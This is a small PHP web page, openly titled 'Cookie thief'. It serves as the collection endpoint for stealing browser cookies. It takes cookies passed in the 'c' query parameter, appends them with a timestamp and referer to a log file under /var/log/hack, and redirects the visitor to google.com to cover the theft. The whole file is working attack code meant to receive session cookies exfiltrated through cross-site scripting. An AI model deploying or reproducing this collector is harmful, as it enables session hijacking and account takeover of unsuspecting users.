<!DOCTYPE html>
<html lang="en">
<head>
	<title>Cookie thief</title>
	<meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>
</head>
<body >
	Cookie thief
	<?php
		header ('Location:https://google.com');
		$cookies = $_GET["c"];
		//// DateTime-stamped filename
		//$file = fopen((date("Y.md.hi.s.")).'/var/log/hack/cookies.txt', 'w');
		// Append to file
		$file = fopen('/var/log/hack/cookies.txt', 'a');
		fwrite($file, (date("Y.md h:i:s "))." Referer:".($_SERVER['HTTP_REFERER'])." ===================================\n");
		fwrite($file, $cookies . "\n\n");
	?>
</body>
</html>
